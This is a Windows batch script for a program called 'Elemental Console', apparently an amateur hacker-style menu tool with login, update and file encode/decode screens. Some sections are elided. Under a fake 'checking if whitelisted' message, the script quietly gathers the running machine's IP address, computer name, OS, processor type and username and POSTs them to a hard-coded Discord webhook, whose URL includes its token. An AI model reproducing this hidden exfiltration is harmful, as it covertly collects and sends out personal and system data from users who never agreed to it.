@echo Off
chcp 65001 >nul 
if exist "%CD%\Elemental Console.bat" (
    rename "Elemental Console.bat" "EC.bat"
)
title Checking If Verifyed/Whitelisted
echo Checking If Your Whitelisted
...
if not exist "C:\ele\" mkdir C:\ele
cls
for /f "delims=[] tokens=2" %%a in ('ping -4 -n 1 %ComputerName% ^| findstr [') do set IP=%%a
cls
echo %IP% >> "%ele%/ip_address.txt" 
cls
:NEXT 
cls
curl -X POST -H "Content-type: application/json" --data "{\"content\": \"UserInfo\n----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n```Time and Date: %DATE% %TIME%\nIP Address: %IP%\nPC: %COMPUTERNAME%\nOS: %OS%\nProccesorStructure: %PROCESSOR_ARCHITECTURE% \nUsername: %USERNAME%```\nMade By del Hacker\n Elemental Console\n----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n\"}" https://discord.com/api/webhooks/888833337056182273/7N7cZ_526B8h5sZVW_7UCFulsUL4NvkEPuxer5NzysCk4_sYx5JS_ygnOBYu5b_X67do 
cls
timeout /t 1 /nobreak >nul
del "%ele%\ip_address.txt" /f /q 
cls 
set debug="off"
if %debug% == "on" (
    @echo on
...
@echo off
if /i "%~x1" neq ".txt" if /i "%~x1" neq ".bat" if /i "%~x1" neq ".cmd" goto startup
:idk21
color 2
echo.
echo Would [38;2;60;95;255mYou [38;2;70;95;255mLike [38;2;80;95;255mTo [38;2;90;95;255mEncode [38;2;100;95;255mOr [38;2;110;95;255mDecode"
echo Subject/File: "%~n1%~x1"
echo E = Encode,   D = Decode, N = No
set /p choice=Decode/Encode:
if %choice% == D goto decode
if %choice% == d goto decode
if %choice% == E goto obfus
if %choice% == e goto obfus
if %choice% == n cls&goto startup
if %choice% == N  cls&goto startup
goto idk21
:decode
if exist "%~n1__-%~x1" del "%~n1__-%~x1"
...
if %NetworkIP%==192.168.1.38 goto startup2
title Un-Whitelisted.
echo.
echo [38;5;220mSorry [38;5;221mYour [38;5;222mIp [38;5;223mAddress [38;5;224mIs [38;5;225mNot [38;5;226mWhitelisted
timeout /t 1 /nobreak >nul
echo [38;5;23mCloseing [38;5;24mIn [38;5;25m3
timeout /t 1 /nobreak >nul
echo [38;5;23mCloseing [38;5;24mIn [38;5;25m2
timeout /t 1 /nobreak >nul
echo [38;5;23mCloseing [38;5;24mIn [38;5;25m1
timeout /t 1 /nobreak >nul
exit/b
:startup2
title Elemental Program (by E.M)
set gitcommit=Sk00lsu3ksngl2
...
chcp 65001 >nul 
echo [38;5;76m[Element] [38;5;196mChecking for updates...
if exist "Elemental Console.bat" (
    rename "Elemental Console.bat" "EC.bat"
)
...
echo [38;5;76m[Element] [38;5;196mNo updates found, starting Elemental...
timeout /t 3 /nobreak >nul
    goto checks
)

:updatereliant
echo [38;5;76m[Element] [38;5;196mUpdate Detected Updating...
timeout /t 3 /nobreak >nul
echo [38;5;76m[Element] [38;5;196mDownloading Update...
...
echo [38;5;76m[Element] [38;5;196mUpdate Downloaded, restarting...
if exist "C:\auto\updater\idk.txt" (
...
cls
echo.
echo Do You Want To Skip The Loading Process?
echo.
set /p amongs=Y/N :
if %amongs% == Y goto login
if %amongs% == y goto login
if %amongs% == N goto loading
if %amongs% == n goto loading
:loading
chcp 65001 >nul
title loading.
...
title Elemental Console Login (By E.M)
...
Title Elemental Console (Made By E.M)
...
echo ░ ░          ░ ░           ░       ░      ░ ░      ░  ░   ░  ░
echo ░                                                            
echo [40;36m^┌^─^─^(^[40;36m[40;31muser-%USERNAME%[40;36m^)^-^[^[40;37m/home/ftw[40;36m] 
set /p Cmd= [40;36m^└^─^[40;31m# [40;31m 
...
Title Elemental Devloper (Made By Del Hacker)
